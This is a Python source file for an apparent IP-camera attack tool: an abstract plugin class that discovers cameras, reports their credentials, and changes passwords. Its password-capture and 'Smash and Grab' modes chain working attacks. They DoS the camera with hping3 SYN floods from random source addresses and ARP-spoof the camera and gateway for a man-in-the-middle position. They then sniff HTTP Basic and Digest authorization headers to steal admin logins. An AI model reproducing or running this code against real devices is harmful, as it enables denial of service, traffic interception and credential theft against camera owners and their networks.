from yapsy.IPlugin import IPlugin
import abc
import itertools
import requests
from requests.exceptions import HTTPError
import sys
from copy import deepcopy
from netaddr import *
import threading
from scapy.all import *
sys.path.append('./')
from Camera import Camera
import base64

class Cameras(IPlugin):
    dip = None #destination IPs
    sip = None #Source IPs
    sif = None #source network interface used for scapy
    debug = None #debug flag
    stderr = None
    stdin = None
    stdout = None
    output = []
    dst_port =69
    timeout_param = 5 
    __metaclass__ = abc.ABCMeta

    def __init__(self,  list_of_ips = None, settings=None):
        self.list_of_ips = list_of_ips
        self.list_of_creds = None
        self.found_cameras = [] # array of objects of type Camera
        self.ip_file = None
        self.threads = 3 #Used to control num of threads for scanning
        self.timeout =  5 #timeout for http requests
        self.sniffed_password =  None #Result of successful doPasswordCapture mode
        self.sniffed_username =  None #Result of successful doPasswordCapture mode
        self.sniff_timeout = None
        self.username = None
        self.password = None
        self.new_password = None # for changing password
        self.output_format = None
        self.synflood_sleep_timer = 5
        self.sniff_timeout = 60 #scapy sniff timeout needs high value for mitm attack
        if settings:
            self.__doSetup(settings)
        
    @abc.abstractmethod
    def _doDiscovery(self):
         """ Abstract _doDiscovery that must be implemented in subclass"""
         pass

    @abc.abstractmethod
    def _doSetup(self, settings ):
         """ Abstract _doSetup that must be implemented in subclass"""
         pass

    def doSetup(self, settings):
        self.__doSetup(settings)
        
    #Helper function which returns user specified camera ip. IP address might be in form of single address, range or file containing addresses.
    def _getNextIP(self):
        #scanning for single ip or list in file
        if self.dip is not None:
            ip_list = IPNetwork(self.dip)
            for myip in ip_list:
                yield myip
        elif self.ip_file is not None:
            file_handle = open(self.ip_file, 'r')
            for file_line in file_handle:
                ip_address = file_line.rstrip()
                ip_list = IPNetwork(ip_address)
                for myip in ip_list:
                    yield myip

    #private method
    def __doSetup(self, settings):
        if settings['dip'] is not None:
            self.dip = settings['dip']
        if settings['sip'] is not None:
            self.sip = settings['sip']
        if settings['sif'] is not None:
            self.sif = settings['sif']
        if settings['list_of_creds'] is not None:
            self.list_of_creds = settings['list_of_creds']
        if settings['debug'] is not None:
            self.debug = settings['debug']
        if settings['threads'] is not None:
            self.threads = settings['threads']
            self.threads = int(self.threads)
        if settings['timeout'] is not None:
            self.timeout = settings['timeout']
        if settings['sniff_timeout'] is not None:
            self.sniff_timeout = settings['sniff_timeout'] #scapy sniff timeout
        if settings['username'] is not None:
            self.username = settings['username']
        if settings['password'] is not None:
            self.password = settings['password']
        if settings['ip_file'] is not None:
            self.ip_file = settings['ip_file']
        if settings['output_format'] is not None:
            self.output_format = settings['output_format']
        if settings['new_password'] is not None:
            self.new_password = settings['new_password']
        self._doSetup( settings )

    def	doDiscovery(self):
        print type(self).__name__ + "Camera Discovery\n"
        return self._doDiscovery()

    """
    Attempt to capture the cameras admin credentials
    """
    def	doCapturePassword(self):
        print type(self).__name__ + "Camera Capture Password\n"
        if self.dip is not None and self.dip is not '' and self.dip != '255.255.255.255':
            return self._doCapturePassword()
        else:
            raise Exception("Must specify single host IP address for capture password mode.")

    @abc.abstractmethod
    def _doCapturePassword(self):
        pass

    """
    Attempt to capture the camera's admin credentials and gather camera info
    """
    def	doSmashAndGrab(self):
        print type(self).__name__ + "Camera Smash and Grab\n"
        if self.dip is not None and self.dip is not '' and self.dip != '255.255.255.255':
            self._doCapturePassword()
            found_cameras = deepcopy(self.found_cameras)
            self.found_cameras = [] # Need to stop circular calls because _details appends to found_cameras
            for camera in found_cameras:
                self._getDetails(ip=camera.ip, username=camera.username, password=camera.password)
        else:
            raise Exception("Must specify single host IP address for capture password mode.")

    @abc.abstractmethod
    def _doOutput(self):
        pass
        
    #Return results and have a chance to format output
    def doOutput(self):
        if self.output_format is None or self.output_format == '':
            self._doOutput() #call child object method implementation
        elif self.output_format == 'csv':
            self.doDiscoveryCSVOutput()

    #Print out details of found cameras.
    def doDiscoveryOutput(self):
        for camera in self.found_cameras:
            output_line = ''
            if camera.ip is not None and camera.ip!='':
                output_line = output_line +"Discovered Camera: IP " +camera.ip
            if camera.mac is not None and camera.mac !='':
               output_line = output_line+  " MAC " + camera.mac
            if camera.model is not None and camera.model !='':
                output_line = output_line+ " Model " + camera.model
            if camera.locked is not None and camera.locked !='':
                output_line = output_line+  " Locked " + str(camera.locked)
            if camera.fullname is not None and camera.fullname !='':
                output_line = output_line+  " Full Name " + camera.fullname
            if camera.username is not None and camera.username !='':
                output_line = output_line+  " Username " + camera.username
            if camera.password is not None and camera.password !='':
                output_line = output_line+  " password " + camera.password
            if camera.description is not None and camera.description !='':
                output_line = output_line+  " Description " + camera.description
            if camera.firmware is not None and camera.firmware !='':
                output_line = output_line+  " Firmware " + camera.firmware
            print output_line

    #Print out details of found cameras.
    def doDiscoveryBlockOutput(self):
        for camera in self.found_cameras:
            output_line = ''
            print "-" * 60
            if camera.ip is not None and camera.ip!='':
                output_line = output_line +"Discovered Camera: IP " +camera.ip+"\n"
            if camera.mac is not None and camera.mac !='':
               output_line = output_line+  " MAC " + camera.mac+"\n"
            if camera.model is not None and camera.model !='':
                output_line = output_line+ " Model " + camera.model+"\n"
            if camera.locked is not None and camera.locked !='':
                output_line = output_line+  " Locked " + str(camera.locked)+"\n"
            if camera.fullname is not None and camera.fullname !='':
                output_line = output_line+  " Full Name " + camera.fullname+"\n"
            if camera.username is not None and camera.username !='':
                output_line = output_line+  " Username " + camera.username+"\n"
            if camera.password is not None and camera.password !='':
                output_line = output_line+  " Password " + camera.password+"\n"
            if camera.description is not None and camera.description !='':
                output_line = output_line+  " Description " + camera.description+"\n"
            if camera.firmware is not None and camera.firmware !='':
                output_line = output_line+  " Firmware " + camera.firmware
            print "-" * 60
            print output_line

    #Print out details of found cameras.
    def doDiscoveryCSVOutput(self):
        separator = ','
        header = "ip,mac,model,locked,full name,username,password,description,firmware"
        print header
        for camera in self.found_cameras:
            output_line = ''
            if camera.ip is not None and camera.ip!='':
                output_line = output_line +camera.ip + separator
            else:
                output_line = output_line + separator
            if camera.mac is not None and camera.mac !='':
                output_line = output_line +camera.mac + separator
            else:
                output_line = output_line + separator
            if camera.model is not None and camera.model !='':
                output_line = output_line +camera.model + separator
            else:
                output_line = output_line + separator
            if camera.locked is not None and camera.locked !='':
                output_line = output_line +camera.locked + separator
            else:
                output_line = output_line + separator
            if camera.fullname is not None and camera.fullname !='':
                output_line = output_line +camera.fullname + separator
            else:
                output_line = output_line + separator
            if camera.username is not None and camera.username !='':
                output_line = output_line +camera.username + separator
            else:
                output_line = output_line + separator
            if camera.password is not None and camera.password !='':
                output_line = output_line +camera.password + separator
            else:
                output_line = output_line + separator
            if camera.description is not None and camera.description !='':
                output_line = output_line +camera.description + separator
            else:
                output_line = output_line + separator
            if camera.firmware is not None and camera.firmware !='':
                output_line = output_line +camera.firmware
            print output_line

    def getClassName(self):
        return type(self).__name__

    #support basic and digest
    def getHTML(self, url, username=None, password=None, auth_method=None):
        from requests.auth import HTTPDigestAuth
        if self.timeout is not None:
            connect_timeout = int(self.timeout)
            read_timeout = int(self.timeout)
            timeout = (int(connect_timeout), int(read_timeout))
        else: timeout = 5
        if self.debug:
            print url
            print 'timeout ' + str(timeout)
        try:
            if username is not None:
                if auth_method == 'digest':
                    r = requests.get(url,  timeout=timeout,  auth=HTTPDigestAuth(username, password))
                else:
                    r = requests.get(url,  timeout=timeout,  auth=(username, password))
            else:
                r = requests.get(url,  timeout=timeout)
            r.raise_for_status()
            return r
        except HTTPError:
            if self.debug:
                print 'Could not download page'
            return r
        except requests.exceptions.ConnectTimeout as e:
            if self.debug:
                print 'Host too slow to pickup connection'
        except requests.exceptions.ReadTimeout as e:
            if self.debug:
                print 'Waited too long between bytes'
        except:
            if self.debug:
                print "Couldn't connect to IP"
        else:
            if self.debug:
                print r.url, 'Download success'
            return r

    #support basic and digest
    def postHTML(self, url, username=None, password=None, auth_method=None, body=None):
        from requests.auth import HTTPDigestAuth
        if self.timeout is not None:
            connect_timeout = int(self.timeout)
            read_timeout = int(self.timeout)
            timeout = (int(connect_timeout), int(read_timeout))
        else: timeout = 5
        if self.debug:
            print url
            print 'timeout ' + str(timeout)
        try:
            if username is not None:
                if auth_method == 'digest':
                    r = requests.post(url,  timeout=timeout,  auth=HTTPDigestAuth(username, password), data=body)
                else:
                    r = requests.post(url,  timeout=timeout,  auth=(username, password), data=body)
            else:
                r = requests.post(url,  timeout=timeout, data=body)
            r.raise_for_status()
            return r
        except HTTPError:
            if self.debug:
                print 'Could not download page'
            return r
        except requests.exceptions.ConnectTimeout as e:
            if self.debug:
                print 'Host too slow to pickup connection'
        except requests.exceptions.ReadTimeout as e:
            if se2lf.debug:
                print 'Waited too long between bytes'
        except:
            if self.debug:
                print "Couldn't connect to IP"
        else:
            if self.debug:
                print r.url, 'Download success'
            return r

    def isCamera(self, ip, username=None, password=None):
        return self._isCamera(ip, username=None, password=None)

    @abc.abstractmethod
    def _isCamera(self, ip, username=None, password=None):
        pass

    def getFirmwareVersion(self, ip, username=None, password=None):
        return self._getFirmwareVersion(ip, username=None, password=None)

    @abc.abstractmethod
    def _getFirmwareVersion(self, ip, username=None, password=None):
        pass

    def getReleaseName(self, ip, username=None, password=None):
        return self.__getReleaseName(ip, username=None, password=None)
        
    @abc.abstractmethod
    def _getReleaseName(self, ip, username=None, password=None):
        pass
        
    def getFullName(self, ip, username=None, password=None):
        return self._getFullName(ip, username=None, password=None)
    
    @abc.abstractmethod
    def _getFullName(self, ip, username=None, password=None):
        pass

    def doStream(self):
        return self._doStream()
    
    @abc.abstractmethod
    def _doStream(self):
        pass

    def isCameraLocked(self, ip, username=None, password=None):
        return self._isCameraLocked(ip, username=None, password=None)

    @abc.abstractmethod
    def _isCameraLocked(self, ip):
        pass

    def getDetails(self, ip):
        return self._getDetails(ip)

    @abc.abstractmethod
    def _getDetails(self, ip):
        pass

    def getMac(self, ip, username, password):
        return self._getMac(ip, username, password)

    @abc.abstractmethod
    def _getMac(self, ip, username, password):
        pass

    #TODO: threading for speed
    def setPassword(self):
        for myip in self._getNextIP():
            self._setPassword(str(myip), self.username,  self.password, self.new_password)

    """
    Going to DoS camera's web daemon using hping3, wait some time and hopefully the server crashes and MitM the server.
    Expect self.dip to be single host ip address of web cam.
    """
    def _doCapturePassword(self):
        #check if hping3 is installed
        if (self.__which("hping3") == None):
            raise Exception("Cannot find hping3 command. Needed for DoS attack.")

        #Place interface into sniff mode ready to start capturing the camera's password
        thread_stop = threading.Event()
        
        t1 = threading.Thread(target=self.__sniffCreds )
        t1.start()
        t2 = threading.Thread(target=self.__mitm, args=[thread_stop])
        t2.start()

        import signal
        #TODO: This DoS attack is very aggressive and not necessary for Arecont cameras but needed for Samsung's. Fix to allow caller to set agression mode.
        pid = self.__synFlood(self.dip)
        pid2 = self.__synFlood(self.dip, dport='80')
        pid3 = self.__synFlood(self.dip, dport='8080')

        if self.debug:
            print "Will allow %s seconds of SynFlood before killing process and MitM." % self.synflood_sleep_timer
            print "Killing child process for SynFlood. %s" % pid
        time.sleep(self.synflood_sleep_timer)
        os.kill(pid, signal.SIGTERM)
        os.kill(pid2, signal.SIGTERM)
        os.kill(pid3, signal.SIGTERM)

        #Wait till scapy process sniffs authc creds. When global sniffed_password is set then we can kill processes
        while (self.sniffed_password =='' or self.sniffed_password is None):
            time.sleep(5)
            print '.'
        thread_stop.set()
        self.found_cameras.append(Camera(ip=self.dip, username=self.sniffed_username, password=self.sniffed_password))
        if self.debug:
            print self.sniffed_username +' ' + self.sniffed_password

    #scapy sniffer for http basic password. Now captures digest hash too.
    def __sniffCreds(self):
        print "Entering sniffing mode"
        m_iface=self.sif
        filter_message="http"
        camera_ip = self.dip

        def pktTCP(pkt):
            global sniffed_password
            count=0
            if pkt.haslayer(TCP) \
                and (pkt.getlayer(TCP).dport == 80 or pkt.getlayer(TCP).sport == 80) \
                and pkt.haslayer(Raw) \
                and (pkt.getlayer(IP).dst == camera_ip or pkt.getlayer(IP).src == camera_ip):
                count=count+1
                payload = pkt.getlayer(Raw).load
                if self.debug:
                    print payload
                m = re.search('.*?Authorization: Basic (.*)', payload)
                if m and m.group(1):
                    creds_b64 = m.group(1)
                    creds_clear = base64.b64decode(creds_b64)
                    extract_creds = re.search('(.+)?:(.*)', creds_clear)
                    if extract_creds and extract_creds.group(1):
                        self.sniffed_username = extract_creds.group(1)
                        self.sniffed_password = extract_creds.group(2)
                    if self.debug:
                        print "Discovered credentials " + creds_clear
                    return
                m = re.search('.*?(Authorization: Digest username=\"(.*?)\".*)', payload)
                if m and m.group(1): # TODO: extract username and other values
                    self.sniffed_username = m.group(2)
                    creds_digest = m.group(1)
                    self.sniffed_password = creds_digest
                    if self.debug:
                        print "Discovered digest credentials " + creds_digest
        if self.debug:
            print 'Scapy sniff timeout ' + str(self.sniff_timeout)
        sniff(iface=m_iface,prn=pktTCP, store=0, timeout=self.sniff_timeout) # store=1 uses up all ram 

    #Similar to nix which program
    def __which(self, program):
        import os
        def is_exe(fpath):
            return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

        fpath, fname = os.path.split(program)
        if fpath:
            if is_exe(program):
                return program
        else:
            for path in os.environ["PATH"].split(os.pathsep):
                path = path.strip('"')
                exe_file = os.path.join(path, program)
                if is_exe(exe_file):
                    return exe_file

        return None
        
    #Very specific to linux
    def __isForwardingEnabled(self):
        flag = ''
        forwarding_filename =  '/proc/sys/net/ipv4/ip_forward'
        with open(forwarding_filename, 'r') as forwarding_file:
            flag = forwarding_file.readline()
        if self.debug is not None:
            print 'Forwarding flag ' + forwarding_filename + ' ' +flag
        flag = flag.rstrip()
        if flag == '1':
            return True
        
    """
    sudo sysctl -w net.ipv4.ip_forward=1
    This command will actually write (-w) in the file /proc/sys/net/ipv4/ip_forward (net.ipv4.ip_forward) the value 1 (=1).
    sudo sysctl -p
    """                
    def __mitm(self, stop_event):
        print "Send arp spoofs"
        if self.__isForwardingEnabled() is not True:
            raise Exception('Forwarding is not enabled on this host and MitM attack cannot start. Try #sudo sysctl -w net.ipv4.ip_forward=1')
        victim_ip = self.dip
        interface = self.sif
        gateway = self.__get_default_gateway_ip(interface)

        to_victim = self.__create_packet(gateway, victim_ip, interface)
        to_gateway = self.__create_packet(victim_ip, gateway, interface)
        if self.debug:
            print interface, gateway
            print "Make sure you have packet forwarding enabled!"    

        while (not stop_event.is_set()):
            send(to_victim, verbose=0)
            send(to_gateway, verbose=0)
            time.sleep(1)

    def __get_default_gateway_ip(self, iface):
        try:
            return [x[2] for x in scapy.all.conf.route.routes if x[3] == iface and x[2] != '0.0.0.0'][0]
        except IndexError:
            print "Error: Network interface '%s' not found!" % interface
            return False

    def __create_packet(self, src_ip, dst_ip, iface):
        packet = ARP()
        packet.psrc = src_ip
        packet.pdst = dst_ip
        packet.hwsrc = get_if_hwaddr(iface)
        if self.debug:
            print packet.summary
        return packet
        
    """
    DoS IP camera through web service and cause server to reboot.
    Returns process id.
    """
    def __synFlood(self, ip_address, dport = '80'):
        args = ['hping3', '-i','u1','-p',dport,ip_address,'-S', '-V', '--rand-source']
        #args = ['hping3', '--flood','-S','-p',dport,ip_address,'--rand-source', '-V']
        print "Running hping3 DoS SynFlood"
        p = subprocess.Popen(args)
        return p.pid
